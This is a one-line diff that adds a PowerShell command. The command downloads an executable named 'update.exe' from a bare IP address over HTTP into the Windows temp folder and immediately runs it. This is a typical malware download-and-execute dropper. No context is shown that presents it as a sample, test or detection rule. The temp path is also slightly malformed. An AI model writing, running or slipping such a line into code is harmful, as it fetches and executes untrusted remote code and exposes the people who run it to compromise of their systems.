@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.34/update.exe',"$env:TEMPtmpfile86.exe");Start-Process ("$env:TEMPtmpfile86.exe")
